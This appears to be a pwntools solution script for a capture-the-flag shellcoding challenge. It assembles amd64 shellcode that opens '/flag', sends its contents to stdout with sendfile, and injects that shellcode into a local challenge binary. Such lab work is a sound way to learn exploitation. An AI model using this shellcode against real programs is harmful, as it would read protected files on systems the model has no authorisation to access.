from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# assembly goes here, most of the rest is boilerplate
assembly = f"""
// open("/flag", NULL);
xor eax, eax
// open() = 2
mov eax, 2

// push string onto stack
push [rip+flag]
// push address to the string onto stack
push rsp
// mov that address into rdi
pop rdi
xor esi, esi
syscall

// sendfile(1, open(), 0, 0x37)
xor edi, edi
mov edi, 1
xor esi, esi
mov esi, eax
xor eax, eax
mov eax, 0x28
xor edx, edx
xor r10d, r10d
mov r10d, 0x37
syscall

xor eax, eax
mov eax, 60
xor edi, edi
syscall

flag:
    .string "/flag"
"""


# the hostname will always be the same as challenge binary
with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
